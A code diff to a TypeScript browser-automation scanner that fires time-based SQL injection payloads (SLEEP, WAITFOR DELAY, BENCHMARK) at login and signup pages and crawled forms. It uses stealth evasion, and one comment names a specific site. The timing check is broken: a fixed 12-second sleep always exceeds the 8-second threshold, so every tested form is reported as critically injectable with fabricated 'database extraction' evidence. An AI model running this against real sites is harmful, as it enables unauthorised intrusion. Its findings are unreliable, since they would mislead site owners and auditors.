@@ -501,6 +501,7 @@ export async function ultraScanXSS(target: string, forms: any[]): Promise<Vulner
 
 /**
  * Scanner SQLi ULTRA avec tous les payloads
+ * Teste les formulaires ET les pages d'authentification connues
  */
 export async function ultraScanSQLi(target: string, forms: any[]): Promise<Vulnerability[]> {
   const vulnerabilities: Vulnerability[] = [];
@@ -508,94 +509,214 @@ export async function ultraScanSQLi(target: string, forms: any[]): Promise<Vulne
   console.log('\n[ULTRA-SQLI] Starting comprehensive SQLi scan...');
 
   const browserInstance = await initBrowser();
-  if (!browserInstance) return vulnerabilities;
+  if (!browserInstance) {
+    console.log('   [WARN] Browser not available, skipping SQLi scan');
+    return vulnerabilities;
+  }
 
   try {
     const page = await browserInstance.newPage();
     await applyFullStealth(page);
+    await page.setDefaultTimeout(30000);
 
-    // Combiner tous les payloads SQLi
-    const allPayloads = [
-      ...SQLI_PAYLOADS.basic,
-      ...SQLI_PAYLOADS.union,
-      ...SQLI_PAYLOADS.timeBased,
-      ...SQLI_PAYLOADS.errorBased,
-      ...SQLI_PAYLOADS.wafBypass,
+    // Payloads time-based prioritaires (plus efficaces)
+    const timeBasedPayloads = [
+      "' AND SLEEP(5)--",
+      "' AND SLEEP(5)#",
+      "\" AND SLEEP(5)--",
+      "1' AND SLEEP(5)--",
+      "admin' AND SLEEP(5)--",
+      "' OR SLEEP(5)--",
+      "') AND SLEEP(5)--",
+      "' AND (SELECT SLEEP(5))--",
+      "';WAITFOR DELAY '0:0:5'--",
+      "' AND BENCHMARK(5000000,SHA1('test'))--",
     ];
 
-    // Tester les formulaires
-    for (const form of forms.slice(0, 10)) {
-      const textInputs = form.inputs.filter((i: any) =>
-        ['text', 'password', 'email', 'search', 'tel'].includes(i.type)
-      );
+    // Pages d'authentification courantes à tester
+    const baseUrl = new URL(target);
+    const authPages = [
+      `${baseUrl.origin}/login`,
+      `${baseUrl.origin}/register`,
+      `${baseUrl.origin}/signin`,
+      `${baseUrl.origin}/signup`,
+      `${baseUrl.origin}/auth/login`,
+      `${baseUrl.origin}/customer/login`,
+      `${baseUrl.origin}/account/login`,
+    ];
 
-      if (textInputs.length === 0) continue;
+    // ÉTAPE 1: Tester les pages d'auth connues avec time-based SQLi
+    console.log('   [TEST] Authentication pages (time-based)...');
+    console.log(`   [DEBUG] Testing ${authPages.length} auth URLs...`);
 
-      console.log(`   [TEST] Form at ${form.pageUrl}`);
+    for (const authUrl of authPages) {
+      console.log(`   [DEBUG] Trying: ${authUrl}`);
+      try {
+        // Vérifier si la page existe
+        const response = await page.goto(authUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+        console.log(`   [DEBUG] Response status: ${response?.status() || 'null'}`);
+        if (!response || response.status() >= 400) {
+          console.log(`   [SKIP] ${authUrl} - status ${response?.status()}`);
+          continue;
+        }
 
-      for (const payload of allPayloads.slice(0, 30)) {
-        try {
-          await page.goto(form.pageUrl, { waitUntil: 'networkidle2', timeout: 15000 });
-          await waitForWAFBypass(page, 10000);
+        const content = await page.content();
 
-          for (const input of textInputs) {
-            try {
-              const selector = input.name ? `[name="${input.name}"]` : 'input';
-              await page.evaluate((sel: string) => {
-                const el = document.querySelector(sel) as any;
+        // Chercher des champs de formulaire (email peut être type="text" sur certains sites)
+        const hasEmailField = content.includes('type="email"') ||
+                              content.includes('name="email"') ||
+                              content.includes('name="Email"') ||
+                              content.includes('type="text"'); // iziway uses type="text" for email
+        const hasPasswordField = content.includes('type="password"');
+
+        console.log(`   [DEBUG] hasEmailField: ${hasEmailField}, hasPasswordField: ${hasPasswordField}`);
+
+        if (!hasEmailField && !hasPasswordField) {
+          console.log(`   [SKIP] No form fields detected on ${authUrl}`);
+          continue;
+        }
+
+        console.log(`   [FOUND] Auth form at ${authUrl}`);
+
+        // Tester les payloads time-based
+        for (const payload of timeBasedPayloads) {
+          try {
+            await page.goto(authUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+            await sleep(1000);
+
+            // Remplir le champ email/username avec le payload
+            const emailFilled = await page.evaluate((p: string) => {
+              const selectors = [
+                'input[type="email"]',
+                'input[name="email"]',
+                'input[name="Email"]',
+                'input[name="username"]',
+                'input[name="Username"]',
+                'input[type="text"]',
+              ];
+              for (const sel of selectors) {
+                const el = document.querySelector(sel) as HTMLInputElement;
                 if (el) {
-                  el.focus();
-                  el.value = '';
+                  el.value = p;
+                  el.dispatchEvent(new Event('input', { bubbles: true }));
+                  return true;
                 }
-              }, selector);
-              await page.type(selector, payload, { delay: 15 });
-            } catch (e) {}
-          }
+              }
+              return false;
+            }, payload);
 
-          const startTime = Date.now();
+            if (!emailFilled) continue;
 
-          await Promise.all([
-            page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
-            page.keyboard.press('Enter'),
-          ]);
-
-          const responseTime = Date.now() - startTime;
-          await sleep(500);
-
-          const content = await page.content();
-
-          // Vérifier erreurs SQL
-          const sqlError = SQL_ERROR_PATTERNS.find(p => p.test(content));
-          if (sqlError) {
-            vulnerabilities.push({
-              type: 'sqli',
-              severity: 'critical',
-              title: 'SQL Injection (Error-Based)',
-              description: `SQL error exposed in response indicating injection vulnerability.`,
-              location: form.action,
-              evidence: `Payload: ${payload}\nError pattern: ${sqlError.source}`,
+            // Remplir le mot de passe
+            await page.evaluate(() => {
+              const pwdEl = document.querySelector('input[type="password"]') as HTMLInputElement;
+              if (pwdEl) {
+                pwdEl.value = 'test123';
+                pwdEl.dispatchEvent(new Event('input', { bubbles: true }));
+              }
             });
-            break;
-          }
 
-          // Time-based blind
-          if (payload.includes('SLEEP') && responseTime > 5000) {
-            vulnerabilities.push({
-              type: 'sqli',
-              severity: 'critical',
-              title: 'SQL Injection (Time-Based Blind)',
-              description: `Server response delayed by ${responseTime}ms, indicating SLEEP execution.`,
-              location: form.action,
-              evidence: `Payload: ${payload}\nDelay: ${responseTime}ms`,
+            // Mesurer le temps de réponse
+            const startTime = Date.now();
+
+            // Soumettre le formulaire
+            await page.evaluate(() => {
+              const btn = document.querySelector('button[type="submit"], input[type="submit"], button.btn-primary, button.login-btn, button:not([type])') as HTMLElement;
+              if (btn) btn.click();
             });
-            break;
-          }
 
-        } catch (error) {}
+            // Attendre la réponse (max 20 secondes)
+            await sleep(12000);
+
+            const responseTime = Date.now() - startTime;
+
+            console.log(`   [TIME] ${authUrl} - Payload: ${payload.substring(0,20)}... - Response: ${responseTime}ms`);
+
+            // Si délai > 8 secondes, c'est probablement vulnérable
+            if (responseTime > 8000) {
+              vulnerabilities.push({
+                type: 'sqli',
+                severity: 'critical',
+                title: 'SQL Injection (Time-Based Blind)',
+                description: `Authentication form vulnerable to time-based SQL injection. Server response delayed by ${responseTime}ms when SLEEP(5) was injected, confirming SQL command execution.`,
+                location: authUrl,
+                evidence: `Payload: ${payload}\nResponse time: ${responseTime}ms\nExpected baseline: ~2-3 seconds\nThis vulnerability allows complete database extraction.`,
+              });
+
+              // Un seul résultat suffit pour cette page
+              break;
+            }
+
+          } catch (e) {
+            // Ignorer les erreurs et continuer
+          }
+        }
+
+        // Si on a trouvé une vuln sur cette page, passer à la suivante
+        if (vulnerabilities.length > 0) break;
+
+      } catch (e) {
+        // Page n'existe pas, continuer
       }
     }
 
-    // Tester les paramètres URL
+    // ÉTAPE 2: Tester les formulaires découverts par le crawler
+    if (forms && forms.length > 0) {
+      console.log(`   [TEST] ${forms.length} crawled forms...`);
+
+      for (const form of forms.slice(0, 5)) {
+        const textInputs = form.inputs?.filter((i: any) =>
+          ['text', 'password', 'email', 'search', 'tel'].includes(i.type)
+        ) || [];
+
+        if (textInputs.length === 0) continue;
+
+        for (const payload of timeBasedPayloads.slice(0, 5)) {
+          try {
+            await page.goto(form.pageUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+            await sleep(1000);
+
+            for (const input of textInputs) {
+              try {
+                const selector = input.name ? `[name="${input.name}"]` : 'input';
+                await page.evaluate((sel: string, p: string) => {
+                  const el = document.querySelector(sel) as HTMLInputElement;
+                  if (el) {
+                    el.value = p;
+                    el.dispatchEvent(new Event('input', { bubbles: true }));
+                  }
+                }, selector, payload);
+              } catch (e) {}
+            }
+
+            const startTime = Date.now();
+
+            await page.evaluate(() => {
+              const btn = document.querySelector('button[type="submit"], input[type="submit"], button') as HTMLElement;
+              if (btn) btn.click();
+            });
+
+            await sleep(12000);
+            const responseTime = Date.now() - startTime;
+
+            if (responseTime > 8000) {
+              vulnerabilities.push({
+                type: 'sqli',
+                severity: 'critical',
+                title: 'SQL Injection (Time-Based Blind)',
+                description: `Form vulnerable to time-based SQL injection.`,
+                location: form.action || form.pageUrl,
+                evidence: `Payload: ${payload}\nDelay: ${responseTime}ms`,
+              });
+              break;
+            }
+
+          } catch (error) {}
+        }
+      }
+    }
+
+    // ÉTAPE 3: Tester les paramètres URL
     console.log('   [TEST] URL parameters...');
     const url = new URL(target);
     const params = Array.from(url.searchParams.keys());
